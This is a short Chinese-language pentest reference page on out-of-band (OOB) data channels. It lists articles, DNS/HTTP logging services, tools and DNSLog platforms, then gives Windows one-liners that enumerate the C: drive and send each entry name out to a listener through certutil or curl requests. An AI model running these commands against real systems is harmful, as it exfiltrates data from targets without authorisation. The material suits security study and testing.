# OOB

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**相关文章**
- [带外通道技术（OOB）总结](https://www.freebuf.com/articles/web/201013.html)
- [OOB（out of band）分析系列之DNS渗漏](https://cloud.tencent.com/developer/article/1047283)
- [Burpsuite之BurpCollaborator模块介绍](https://www.jianshu.com/p/92b4b8ddf12f)
- [Persistent Access to Burp Suite Sessions - Step-by-Step Guide](https://www.onsecurity.io/blog/persistent-access-to-burp-suite-sessions-step-by-step-guide/)
- [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
- [HTTP BLIND](https://web.archive.org/web/20200224073305/https://echocipher.github.io/2019/07/22/HTTP-BLIND/)
- [Cracking the lens: targeting HTTP's hidden attack-surface](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)

**在线监控平台**
- http://ceye.io/
- https://webhook.site
- http://www.dnslog.cn/
- https://iplogger.org/

**相关工具**
- [uknowsec/SharpNetCheck](https://github.com/uknowsec/SharpNetCheck) - 该工具可以在 dnslog 中回显内网 ip 地址和计算机名，可实现内网中的快速定位可出网机器。
- [Buzz2d0/Hyuga](https://github.com/Buzz2d0/Hyuga) - 一个用来检测带外(Out-of-Band)流量(DNS查询和HTTP请求)的监控工具。
- [ztgrace/mole](https://github.com/ztgrace/mole) - 识别和利用out-of-band (OOB)漏洞的burp扩展

**平台搭建**
- [BugScanTeam/DNSLog](https://github.com/BugScanTeam/DNSLog) - DNSLog 是一款监控 DNS 解析记录和 HTTP 访问记录的工具。
- [lanyi1998/DNSlog-GO](https://github.com/lanyi1998/DNSlog-GO) - DNSLog-GO 是一款 golang 编写的监控 DNS 解析记录的工具，自带 WEB 界面
- [chennqqi/godnslog](https://github.com/chennqqi/godnslog)

---

# HTTP

**Windows**

- certutil

    使用 certutil 请求证书文件，并将下载文件重定向到 nul，无缓存、无需浏览器实现发起 http 请求
    ```bash
    for /F %x in ('dir /b c:\') do certutil -urlcache -split -f "http://127.0.0.1:8000/?result=%x" nul
    ```

- curl

    win10 等环境支持 curl
    ```bash
    for /F %x in ('dir /b c:\') do curl http://127.0.0.1:8000/%x
    ```
